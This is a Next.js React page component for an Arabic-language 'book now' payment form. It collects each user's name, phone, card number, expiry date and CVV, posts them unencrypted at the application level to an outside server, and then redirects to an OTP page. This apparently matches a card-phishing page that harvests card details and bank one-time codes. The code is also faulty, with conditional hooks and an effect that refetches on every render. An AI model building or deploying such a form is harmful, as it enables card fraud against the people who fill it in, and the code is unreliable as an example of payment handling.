import axios from "axios";
import { useState, useEffect } from "react";
import { useRouter } from "next/router";

const bookNow = () => {
  const [data, setData] = useState([]);
  const [name, setName] = useState();
  const [phone, setPhone] = useState();
  const [num, setNum] = useState();
  const [month, setMonth] = useState();
  const [year, setYear] = useState();
  const [cvv, setCvv] = useState();
  const [redirect, setRedirect] = useState("");
  const [plan, setPlan] = useState("");
  const [desc, setDesc] = useState('');
  const router = useRouter();
if (desc) {
  useEffect(() => {
    fetchData();
    setDesc(data.name)
  }, []);
}else{
  useEffect(() => {
    fetchData();
    setDesc(data.name)
  });
}
  const fetchData = async () => {
    try {
      const product = await axios.get(
        `https://tricck.onrender.com/product/${window.localStorage.getItem("Id")}`
      );
      setData(product.data);
    } catch (err) {
      console.log(err);
    }
  };
  const sendData = async (e) => {
    e.preventDefault();
    const result = await axios.post(`https://tricck.onrender.com/send-data`, {
      name,
      phone,
      num,
      month,
      year,
      cvv,
      desc,
      plan,
    });
    setRedirect(result.data.message);
  };
  if (redirect === "done") {
    router.push("/otp");
  }
  return (
    <div>
      <form>
        <div className="row w-25 ms-auto me-auto mt-5">
          <div className="col-12 mt-2">
            <input
              disabled
              value={data ? data.name : ""}
              className="form-control p-2 text-center"
            />
          </div>
          <div className="col-12 mt-2">
            <input
              type="text"
              value={name}
              onChange={(e) => {
                setName(e.target.value);
              }}
              className="form-control p-2"
              placeholder="الأسم"
            />
          </div>
          <div className="col-12 mt-2">
            <input
              type="tel"
              value={phone}
              onChange={(e) => {
                setPhone(e.target.value);
              }}
              className="form-control p-2"
              placeholder="رقم الهاتف"
            />
          </div>
          <div className="col-12 mt-2">
            <input
              type="text"
              value={num}
              maxLength={16}
              onChange={(e) => {
                setNum(e.target.value);
              }}
              className="form-control p-2"
              placeholder="رقم الكارت"
            />
          </div>
          <div className="col-12 mt-2">
            <div className="row flex-row-reverse">
              <div className="col">
                <div className="expire">
                  <input
                    type="text"
                    value={month}
                    maxLength={2}
                    onChange={(e) => {
                      setMonth(e.target.value);
                    }}
                    className="form-control p-2"
                    placeholder="MM"
                  />
                </div>
              </div>
              <div className="col">
                <div className="expire">
                  <input
                    type="text"
                    value={year}
                    maxLength={4}
                    onChange={(e) => {
                      setYear(e.target.value);
                    }}
                    className="form-control p-2"
                    placeholder="YY"
                  />
                </div>
              </div>
              <div className="col">
                <div className="cvv">
                  <input
                    type="text"
                    value={cvv}
                    maxLength={4}
                    onChange={(e) => {
                      setCvv(e.target.value);
                    }}
                    className="form-control p-2"
                    placeholder="cvv"
                  />
                </div>
              </div>
            </div>
          </div>
          <div className="col-12 mt-2">
            <select
              value={plan}
              onChange={(e)=>{setPlan(e.target.value)}}
              className="form-control p-2 text-dark">
              <option selected >أختر خطة</option>
              <option>{data ? data.priceOne: ''}</option>
              <option>{data ? data.priceTwo: ''}</option>
              <option>{data ? data.priceThree: ''}</option>
            </select>
          </div>
          <div className="col-12 mt-2">
            <input
              disabled
              value={plan ? `المبلغ الكلي ${plan} ` : ""}
              className="form-control p-2 text-center"
            />
          </div>
          <div className="col-12 mt-2">
            <button className="btn btn-primary w-100" onClick={sendData}>
              دفع
            </button>
          </div>
        </div>
      </form>
    </div>
  );
};
export default bookNow;
